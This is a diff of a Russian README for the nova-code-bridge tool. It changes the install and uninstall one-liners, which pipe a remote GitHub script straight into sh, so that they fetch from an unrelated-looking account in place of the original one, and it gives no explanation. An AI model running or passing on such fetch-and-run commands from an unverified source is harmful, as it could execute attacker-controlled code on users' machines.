@@ -5,7 +5,7 @@
 ## Установка
 
 ```sh
-curl -fsSL https://raw.githubusercontent.com/kesha666-opt/nova-code-bridge/main/scripts/install.sh | sh
+curl -fsSL https://raw.githubusercontent.com/caspercbwilliambzb13-del/nova-code-bridge/main/scripts/install.sh | sh
 ```
 
 После зелёного статуса в панели откройте терминал и запустите:
@@ -36,7 +36,7 @@ NVIDIA NIM.
 ## Удаление
 
 ```sh
-curl -fsSL https://raw.githubusercontent.com/kesha666-opt/nova-code-bridge/main/scripts/uninstall.sh | sh
+curl -fsSL https://raw.githubusercontent.com/caspercbwilliambzb13-del/nova-code-bridge/main/scripts/uninstall.sh | sh
 ```
 
 Удаление не затрагивает Claude Code или установленный FCC. Папка Nova Code переносится в резервную копию с датой.
